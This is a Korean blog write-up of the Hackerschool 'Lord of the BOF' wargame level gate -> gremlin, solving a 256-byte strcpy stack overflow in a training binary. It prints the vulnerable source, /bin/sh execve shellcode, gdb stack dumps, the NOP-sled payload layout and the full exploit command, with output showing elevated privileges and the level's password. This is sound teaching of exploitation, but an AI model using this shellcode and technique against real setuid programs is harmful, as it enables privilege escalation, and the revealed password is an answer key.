---
layout: post
title: "[Wargame]  해커스쿨 BoF LEVEL1 (gate -> gremlin) :  simple bof"
date: 2015-10-18 21:00
categories:  wargame
tags: [bof]
---

[해커스쿨 왕기초편](http://www.hackerschool.org/Sub_Html/HS_University/bof_1.html)을 읽고 나서 제대로 BoF 훈련을 해보기 위하여 [BoF 원정대 Wargame](http://www.hackerschool.org/HS_Boards/zboard.php?id=HS_Notice&no=1170881885)을 시작하였다.
Stage 하나하나 직접 해보자. :)

<!--more-->

## BoF LEVEL1 (gate -> gremlin) :  simple bof

256bytes 사이즈의 큰 buffer 에 BoF 완성하면 되는 문제.

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

## shellcoe 확보

Scratch 부터  shellcode 작성할 수 있으면 좋겠지만.. 우선은 Linux x86 에서 shell 띄우는 shellcode 를 찾아보았다.

[Writing shellcode for Linux and *BSD](http://www.kernel-panic.it/security/shellcode/shellcode5.html)

### c-code

`execve()` 이용하여 `/bin/sh` 실행하는 아주 간단한 코드. 

```c
#include <unistd.h>

int main() {
        char *args[2];
        args[0] = "/bin/sh";
        args[1] = NULL;
        execve(args[0], args, NULL);
}
```

BoF 원정대의 VM 환경에서 shell 띄우기 동작함.

```bash
> gcc -g -o get_shell get_shell.c 
> ./get_shell 
bash$ id
uid=500(gate) gid=500(gate) groups=500(gate)
```

### shellcode : assembly 변환

위의 c 코드를  compile 된 obj 를 가지고 shellcode 로서 동작시키 위하여 null byte 를 없애는 등의 작업을 해야하는데... 우선 초보이므로 최종 결과물을 사용해보자.  대신 좀더 익숙해지면 반드시 직접 손으로 shellcode 짜야한다. 

### 최종 shellcode

```c
char shellcode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
                   "\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
                   "\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int main()
{
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int)shellcode;
}
```

## Dynamic debugging

BoF 를 하기 위하여 중요한 정보는 다음과 같다.

- Buffer size
- Return address

우리는 Wargame 으로서 소스를 가지고 있어서 buffer 의 사이즈가 256bytes 라는 것은 운좋게도 알고 있는 상황이다. 

### Return address 확인

하지만 코드가 수행되고 있는 stack address 는 알지 못한다. 이 값을 알아야 BoF 에서 가장 중요한 stack 에 저장된 saved return address 대신에 exploit code 의 어드레스로 바꾸어 주어야 한다. 

문제의 실행파일인 `gremlin` 파일의 권한이 `gremlin` 이라서  1단계 `gate` 는 권한이 부족하여 gdb debugging 이 제대로 되지 않는 것 같다.

```bash
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
```

대신 직접 compile 하여 gdb debugging 을 하여 보자.

```bash
> gcc -g -o gremlin2 gremlin.c
> ls -al
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
-rw-rw-r--    1 gate     gate          272 Mar 29  2010 gremlin.c
-rwxrwxr-x    1 gate     gate        12583 Oct 25 16:04 gremlin2
```

	
```bash
(gdb) disas
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %esp,%ebp
0x8048433 <main+3>:     sub    $0x100,%esp
0x8048439 <main+9>:     cmpl   $0x1,0x8(%ebp)
0x804843d <main+13>:    jg     0x8048456 <main+38>
0x804843f <main+15>:    push   $0x80484e0
0x8048444 <main+20>:    call   0x8048350 <printf>
0x8048449 <main+25>:    add    $0x4,%esp
0x804844c <main+28>:    push   $0x0
0x804844e <main+30>:    call   0x8048360 <exit>
0x8048453 <main+35>:    add    $0x4,%esp
0x8048456 <main+38>:    mov    0xc(%ebp),%eax
0x8048459 <main+41>:    add    $0x4,%eax
0x804845c <main+44>:    mov    (%eax),%edx
0x804845e <main+46>:    push   %edx
0x804845f <main+47>:    lea    0xffffff00(%ebp),%eax
0x8048465 <main+53>:    push   %eax
0x8048466 <main+54>:    call   0x8048370 <strcpy>
0x804846b <main+59>:    add    $0x8,%esp
0x804846e <main+62>:    lea    0xffffff00(%ebp),%eax
0x8048474 <main+68>:    push   %eax
0x8048475 <main+69>:    push   $0x80484ec
0x804847a <main+74>:    call   0x8048350 <printf>
0x804847f <main+79>:    add    $0x8,%esp
0x8048482 <main+82>:    leave  
0x8048483 <main+83>:    ret   
```

```bash
(gdb) x/100x $esp
0xbffff920:     0xbffff928      0xbffffb86      0x90909090      0x90909090
0xbffff930:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff940:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff950:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff960:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff970:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff980:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff990:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff9f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffa00:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffa10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffa20:     0x90909090      0x90909090      0xbffffa00      0x400309cb
0xbffffa30:     0x00000002      0xbffffa74      0xbffffa80      0x40013868
0xbffffa40:     0x00000002      0x08048380      0x00000000      0x080483a1
0xbffffa50:     0x08048430      0x00000002      0xbffffa74      0x080482e0
0xbffffa60:     0x080484bc      0x4000ae60      0xbffffa6c      0x40013e90
0xbffffa70:     0x00000002      0xbffffb72      0xbffffb86      0x00000000
0xbffffa80:     0xbffffc87      0xbffffca9      0xbffffcb3      0xbffffcc1
0xbffffa90:     0xbffffce0      0xbffffced      0xbffffd05      0xbffffd1f
0xbffffaa0:     0xbffffd3e      0xbffffd49      0xbffffd57      0xbffffd97
```

버퍼 사이즈가 충분히 길기 때문에 shellcode 38bytes 앞에 [NOP] 를 넣고, 가장 중요한 [LR] 넣어서 exploit 구성함.

```bash
[Buffer 256 bytes] + [SFP 4bytes]      + [LR 4 bytes]
[NOP 222 bytes] + [shell code 38bytes] + [LR=0xbffff980]
```

## BoF Exploit

```bash
./gremlin `python -c 'print "\x90"*222 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x80\xf9\xff\xbf"'`
```

```bash
[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*222 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x80\xf9\xff\xbf"'`
^1F嵬bin/sh
                bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)

bash$ my-pass
euid = 501
hello bof world
```


